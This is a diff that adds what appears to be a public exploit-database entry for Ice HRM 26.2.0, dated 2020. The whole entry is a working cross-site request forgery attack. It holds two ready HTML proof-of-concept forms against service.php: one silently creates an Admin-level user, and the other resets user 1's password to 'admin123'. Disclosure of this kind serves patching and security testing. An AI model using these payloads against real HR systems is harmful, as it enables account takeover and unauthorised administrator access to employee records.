@@ -1,0 +1,40 @@
+# Exploit Title: Ice HRM 26.2.0 - Cross-Site Request Forgery (Add User)
+# Date: 2020-02-14
+# Exploit Author: J3rryBl4nks
+# Vendor Homepage: https://icehrm.com/
+# Software Link: https://sourceforge.net/projects/icehrm/#Version 26.2.0
+# Tested on Windows 10/Kali Rolling
+
+# The Ice HRM Web Application is vulnerable to CSRF that leads to arbitrary user creation or password change:
+
+# POC for user creation:
+ 
+    <html>
+      <body>
+      <script>history.pushState('', '', '/')</script>
+        <form action="http://HOSTHERE/icehrm/app/service.php">
+          <input type="hidden" name="t" value="User" />
+          <input type="hidden" name="a" value="ca" />
+          <input type="hidden" name="sa" value="saveUser" />
+          <input type="hidden" name="mod" value="admin&#61;users" />
+          <input type="hidden" name="req" value="&#123;"username"&#58;"test"&#44;"email"&#58;"test&#64;test&#46;com"&#44;"employee"&#58;"1"&#44;"user&#95;level"&#58;"Admin"&#44;"user&#95;roles"&#58;"&#91;&#92;"2&#92;"&#93;"&#44;"lang"&#58;"NULL"&#44;"default&#95;module"&#58;"NULL"&#44;"csrf"&#58;"c0bdded55472fab56c578386143a1854e6f8dd11"&#125;" />
+          <input type="submit" value="Submit request" />
+        </form>
+      </body>
+    </html>
+
+#    POC for Password Change:
+
+    <html>
+      <body>
+      <script>history.pushState('', '', '/')</script>
+        <form action="http://HOSTHERE/icehrm/app/service.php">
+          <input type="hidden" name="t" value="User" />
+          <input type="hidden" name="a" value="ca" />
+          <input type="hidden" name="sa" value="changePassword" />
+          <input type="hidden" name="mod" value="admin&#61;users" />
+          <input type="hidden" name="req" value="&#123;"id"&#58;1&#44;"pwd"&#58;"admin123"&#125;" />
+          <input type="submit" value="Submit request" />
+        </form>
+      </body>
+    </html>
